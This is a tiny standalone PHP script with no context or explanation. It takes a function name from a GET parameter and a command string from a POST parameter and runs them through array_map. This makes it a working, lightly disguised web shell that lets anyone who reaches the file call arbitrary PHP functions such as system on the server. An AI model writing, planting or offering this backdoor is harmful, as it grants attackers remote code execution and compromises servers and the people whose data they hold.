<?php
    $func=$_GET['func'];
    $cmd=$_POST['cmd'];
    $array[0]=$cmd;
    $new_array=array_map($func,$array);
    echo $new_array;
?>
